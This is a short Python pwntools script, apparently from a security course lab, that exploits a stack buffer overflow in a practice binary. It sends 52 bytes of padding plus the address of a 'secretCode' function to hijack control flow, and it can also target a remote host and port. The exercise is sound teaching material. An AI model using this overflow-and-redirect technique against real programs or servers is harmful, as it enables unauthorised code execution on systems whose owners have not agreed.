#!/usr/bin/env python3

import time, os, traceback, sys, os
import pwn
import binascii, array
from textwrap import wrap


def start(argv=[], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath] + argv, gdbscript=gdbscript, *a, **kw)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath]+argv, *a, **kw)

binPath="/home/kali/ENPM691/Lecture8/pwntoolsTest"
isRemote = pwn.args.REMOTE

# build in GDB support
gdbscript = '''
init-pwndbg
break *getCar+37
continue
'''.format(**locals())

# interact with the program to get to where we can exploit
pwn.context.log_level="debug"
elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)

secretCodeAddr = elf.symbols['secretCode']
pwn.info("secretCode Address is: %x", secretCodeAddr)

io = start()
io.recvuntil(b"3. Rent a scooter.")
io.sendline(b"1")
ioCapture = io.recvuntil(b"What would you like to buy?")
pwn.info("Received string: %s",ioCapture)

# define Payload
overFlow = 52*b"A"
secretCode = pwn.p32(secretCodeAddr)
secretCodeFixed = pwn.p32(0x080491cc)

buffer = pwn.flat(
        [
            overFlow,
            secretCode
            ]
        )
io.sendline(buffer)

io.interactive()
